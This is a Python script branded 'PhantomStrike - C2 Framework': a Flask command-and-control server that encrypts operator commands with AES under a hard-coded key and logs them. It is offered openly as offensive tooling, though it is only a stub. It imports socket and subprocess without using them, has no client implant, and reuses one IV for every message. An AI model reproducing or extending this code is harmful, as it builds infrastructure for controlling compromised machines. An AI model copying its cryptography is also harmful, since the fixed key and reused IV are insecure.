import socket
import subprocess
import threading
import base64
import logging
from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Suppress warnings
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module='requests')

# ASCII Art Banner
ascii_art = r"""
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
██████╔╝███████║███████║██╔████╔██║    ██║    █████╗  
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝  
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
               PhantomStrike - C2 Framework
"""
print(ascii_art)

# AES Encryption
key = b'SixteenByteKeyXX'  # Must be 16, 24, or 32 bytes
cipher = AES.new(key, AES.MODE_CBC)

# Flask-based C2 Server
app = Flask(__name__)

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    encrypted_command = encrypt_data(data['command'])
    logging.info(f"Sending encrypted command: {encrypted_command}")
    return jsonify({"status": "sent", "command": encrypted_command.decode()})

def encrypt_data(data):
    iv = cipher.iv
    enc_cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = enc_cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(iv + ciphertext)

if __name__ == "__main__":
    logging.basicConfig(filename="c2_log.txt", level=logging.INFO)
    app.run(host="0.0.0.0", port=5000)
